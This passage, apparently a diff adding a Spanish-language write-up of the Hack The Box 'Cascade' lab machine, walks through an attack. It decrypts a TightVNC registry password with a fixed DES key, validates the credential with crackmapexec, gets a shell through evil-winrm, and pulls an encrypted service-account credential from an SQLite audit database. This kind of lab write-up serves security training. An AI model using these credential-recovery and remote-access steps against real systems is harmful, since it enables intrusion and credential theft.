@@ -202,3 +202,235 @@ perform all tasks related to the network migration and this account will be dele
 related to the migration in security logs etc. "Username is TempAdmin (password is the same as the normal admin account password)." </p>
 ```
 
+Prcedemos a Copiarnos del Recurso Compatido `Data/IT/Temp/s.smith`  el archivo `VNC Install.reg`
+
+```bash
+#cp /mnt/IT/Temp/s.smith/VNC\ Install.reg .
+#ls                                                                                                                                                                            
+'VNC Install.reg'
+```
+
+Procedemos a realizar un `cat`
+```bash
+
+# cat VNC\ Install.reg                                                                 
+��Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+#  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
+```
+
+Intentamos decodarla con el comando `xxd -ps -r` pero no nos devuelve nada legible y claro
+
+Buscamos por `VNC Decryp hex password` en Google
+
+Encontramos el siguiente comando para hacerlo
+
+```bash
+# echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              1 ⚙
+00000000  73 54 33 33 33 76 65 32                        "   |sT333ve2|      "
+00000008
+```
+
+Procedemos a almacenar las credenciales para el usuario:
+`s.smith:sT333ve2`
+
+Chequeamos si este usuario pertenece al `Grupo Remote Managment`
+
+```bash
+# crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                              1 ⚙
+WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+```
+
+Nos conectamos como el usuario `s.smith` usando `evil-winrm.rb`
+```bash
+# evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                                1 ⚙
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents>
+```
+
+Procedemos a enumerar el sistema:
+
+```bash
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir
+
+
+    Directory: C:\Users\s.smith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/18/2022   1:00 PM             34 user.txt
+-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
+
+
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
+44ee5ac9a106aa0c5aa8488xxxxxxxxxx
+```
+
+Procedemos a ver a los grupos que pertenece el usuario `s.smith`
+```bash
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment '
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 7:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 7:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   1/28/2020 11:26:39 PM
+
+Logon hours allowed          All
+
+# Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+Vemos que pertenecemos al Group `Audit Share` & `IT`
+
+```bash
+# smbmap -H 10.10.10.182  -u s.smith -p sT333ve2       
+[+] IP: 10.10.10.182:445        Name: cascade.local                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share 
+```
+
+Procedemos a montarnos una Montura
+
+```bash
+# mount -t cifs //10.10.10.182/AUDIT$ /mnt/ -o username=s.smith,password=sT333ve2,domain=casscade.local,rw
+
+```
+
+```bash
+# tree /mnt                                                                                                                                                                                                                           1 ⚙
+/mnt
+├── "CascAudit.exe"
+├── CascCrypto.dll
+├── DB
+│   └── "Audit.db"
+├── RunAudit.bat
+├── System.Data.SQLite.dll
+├── System.Data.SQLite.EF6.dll
+├── x64
+│   └── SQLite.Interop.dll
+└── x86
+    └── SQLite.Interop.dll
+
+3 directories, 8 files
+                        
+```
+
+Procedemos a descargarnos el archiv "Audit.db" para ver si contiene informacion interesante.
+
+```bash
+#ls                                                                                                                                                                    
+Audit.db  CascAudit.exe  MapAuditDrive.vbs  MapDataDrive.vbs
+```
+
+Enumeramos el archivo "Audit.db"
+```bash
+# file Audit.db                         
+Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
+```
+
+Procedemos a enumerar con SQLite 3.x
+
+```bash
+# sqlite3 Audit.db 
+
+SQLite version 3.36.0 2021-06-18 18:36:39
+Enter ".help" for usage hints.
+sqlite> .tables
+DeletedUserAudit  Ldap              Misc            
+sqlite> select * from Ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+sqlite> 
+```
+
+Encontramos una credencial en base64 para el user `ArkSvc`
+```bash
+# echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64  -d                                                                                                                  
+
+������D�|zC�;
+```
+Vemos que se nos devuelve `Data-No-Legible` por lo que podemos pensar que la contraseña esta cifrada de alguna forma.
+
+Vemos que teniamos un archivo `.exe` en los recursos compartidos que podemos intentar a leer el codigo del binario de windows
+```bash
+# ls                                                                                              
+Audit.db  "CascAudit.exe"
+```
+
+
+
+
+
